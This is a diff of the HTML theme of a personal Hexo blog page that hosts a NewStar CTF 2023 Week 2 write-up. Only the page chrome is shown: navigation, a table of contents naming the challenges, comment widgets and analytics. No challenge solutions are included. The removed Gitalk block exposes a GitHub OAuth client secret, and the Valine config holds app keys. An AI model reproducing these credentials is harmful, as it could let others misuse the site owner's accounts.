+              appId: '7k3CLk60MtrFMwCeGukb3GQJ-gzGzoHsz',
+              appKey: 'qVXoRTYc2mDgd8leYtgZAeq2',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '',
+              lang: 'en'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
+            }
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewStar-2023-Week2"><span class="nav-text">NewStar 2023 Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="nav-text">游戏高手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include-0%E3%80%820"><span class="nav-text">include 0。0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-sql"><span class="nav-text">ez_sql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unserialize"><span class="nav-text">Unserialize?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload-again"><span class="nav-text">Upload again!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#R-C-E"><span class="nav-text">R!!C!!E!!</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BB%B4%E5%95%A4"><span class="nav-text">滴啤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AApi"><span class="nav-text">不止一个pi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#halfcandecode"><span class="nav-text">halfcandecode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#partial-decrypt"><span class="nav-text">partial decrypt</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box shields">
+        
+            <div class="info-item">
+                
+                <a class="shields-item">
+                    <img src="https://img.shields.io/badge/Since-2023_--_2023-dodgerblue?style=flat-square">
+                </a>
+                
+                    <a class="shields-item" href="/">
+                        <img src="https://img.shields.io/badge/WebMaster-S3a-dodgerblue?style=flat-square">
+                    </a>
+                
+                
+                <a class="shields-item" href="https://hexo.io" target="_blank">
+                    <img src="https://img.shields.io/badge/Powered_by-Hexo-dodgerblue?style=flat-square">
+                </a>
+                <a class="shields-item" href="https://github.com/XPoet/hexo-theme-keep" target="_blank">
+                    <img class="shields-keep-version" src="https://img.shields.io/badge/Theme-Keep-dodgerblue?style=flat-square">
+                </a>
+                
+            </div>
+            
+                <div class="info-item">
+                    
+                        
+                    
+                </div>
+            
+        
+
+        <div class="count-item info-item shields">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">Total words</span>
+                    <span class="item-value border-box word">32.4k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewStar-2023-Week2"><span class="nav-text">NewStar 2023 Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="nav-text">游戏高手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include-0%E3%80%820"><span class="nav-text">include 0。0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-sql"><span class="nav-text">ez_sql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unserialize"><span class="nav-text">Unserialize?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload-again"><span class="nav-text">Upload again!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#R-C-E"><span class="nav-text">R!!C!!E!!</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BB%B4%E5%95%A4"><span class="nav-text">滴啤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AApi"><span class="nav-text">不止一个pi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#halfcandecode"><span class="nav-text">halfcandecode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#partial-decrypt"><span class="nav-text">partial decrypt</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/post/share.js"></script>
+        
+    
+
+    <!-- category-page -->
+    
+
+    <!-- links-page -->
+    
+
+    <!-- photos-page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/js/libs/pjax.min.js"></script>
 <script>
-  function setClipboardText(event){
-      // clipboardData 对象是为通过编辑菜单、快捷菜单和快捷键执行的编辑操作所保留的，也就是你复制或者剪切内容
-      let clipboardData = event.clipboardData || window.clipboardData;
-      // 如果未复制或者未剪切，则return出去
-      if (!clipboardData) { return; }
-      event.preventDefault();
-      // Selection 对象，表示用户选择的文本范围或光标的当前位置。
-      //     声明一个变量接收 -- 用户输入的剪切或者复制的文本转化为字符串
-      let text = window.getSelection().toString();
-  
-      if (text) {
-          // 如果文本存在则先取消文本默认事件
-          event.preventDefault();
-          // 通过调用常clipboardData对象的 setData(format, data) 方法；来设置相关文本
-          // format: 一个DOMString 表示要添加到 drag object的拖动数据的类型。
-          // data: 一个 DOMString表示要添加到 drag object的数据。
-          var copyright = '\n\n'
-          + '——————————————————————'
-          + '\n版权声明：本文为「Ywj226」的原创文章，遵循CC BY-NC-ND 4.0版权协议，转载请附上原文出处链接及本声明。'
-          + '\n原文链接：https://iahzl.github.io/NewStar-WriteUp-Week2/'
-  
-          clipboardData.setData('text/plain', text + copyright);
-  
-      }
-  };
-  var contents = document.getElementsByClassName("content");
-  // 监听文章内容的copy事件
-  contents[0].addEventListener('copy',function(e){
-      setClipboardText(e);
-  });
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
 </script>
 
 
 
 
-
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
-    <div id="gitalk-container"></div>
-    <script type="text/javascript">
-        var gitalk = new Gitalk({
-            clientID: 'a4d73b206590627d55c0',
-            clientSecret: '68744004f2191865ab4a5e6ee2eba67c673c6795',
-            id: md5(window.location.pathname),
-            repo: 'iahzl.github.io',
-            owner: 'iahzl',
-            admin: 'iahzl',
-            distractionFreeMode: ''
-        })
-        gitalk.render('gitalk-container')
-    </script>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">Home</a></li>
-        
-          <li><a href="/categories/">Categories</a></li>
-        
-          <li><a href="/tags/">Tags</a></li>
-        
-          <li><a href="/archives/">Writing</a></li>
-        
-          <li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-          <li><a href="/about/">About</a></li>
-        
-      </ul>
-    </div>
-
     
+        
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStar-2023-Week2"><span class="toc-number">1.</span> <span class="toc-text">NewStar 2023 Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">游戏高手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-0%E3%80%820"><span class="toc-number">1.1.2.</span> <span class="toc-text">include 0。0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-sql"><span class="toc-number">1.1.3.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize"><span class="toc-number">1.1.4.</span> <span class="toc-text">Unserialize?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-again"><span class="toc-number">1.1.5.</span> <span class="toc-text">Upload again!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.6.</span> <span class="toc-text">R!!C!!E!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%B4%E5%95%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">滴啤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AApi"><span class="toc-number">1.2.2.</span> <span class="toc-text">不止一个pi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#halfcandecode"><span class="toc-number">1.2.3.</span> <span class="toc-text">halfcandecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#partial-decrypt"><span class="toc-number">1.2.4.</span> <span class="toc-text">partial decrypt</span></a></li></ol></li></ol></li></ol>
-      </div>
+        
+            
+<script class="custom-inject-js" src="/js/time.js" data-pjax></script>
+
+        
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar-WriteUp-Week2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&text=NewStar 2023 Week2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&is_video=false&description=NewStar 2023 Week2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=NewStar 2023 Week2&body=Check out this article: https://iahzl.github.io/NewStar-WriteUp-Week2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&name=NewStar 2023 Week2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar-WriteUp-Week2/&t=NewStar 2023 Week2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2023
-    iahzl
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-      --><li><a href="/">Home</a></li><!--
-    --><!--
-      --><li><a href="/categories/">Categories</a></li><!--
-    --><!--
-      --><li><a href="/tags/">Tags</a></li><!--
-    --><!--
-      --><li><a href="/archives/">Writing</a></li><!--
-    --><!--
-      --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
-    --><!--
-      --><li><a href="/search/">Search</a></li><!--
-    --><!--
-      --><li><a href="/about/">About</a></li><!--
-    -->
-      </ul>
-      <ul>
-        
-          <!-- 不蒜子统计 -->
-          <span id="busuanzi_container_site_pv">
-              本站总访问量<span id="busuanzi_value_site_pv"></span>次
-          </span>
-          <span class="post-meta-divider">|</span>
-          <span id="busuanzi_container_site_uv" style='display:none'>
-                  本站访客数<span id="busuanzi_value_site_uv"></span>人
-          </span>
-        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        
-      </ul>
-    </nav>
-  </div>
-  
-</footer>
-
-
-
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-  <script type="text/javascript">
-        var _hmt = _hmt || [];
-        (function() {
-          var hm = document.createElement("script");
-          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
-          var s = document.getElementsByTagName("script")[0];
-          s.parentNode.insertBefore(hm, s);
-        })();
-        </script>
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
 
 </body>
 </html>
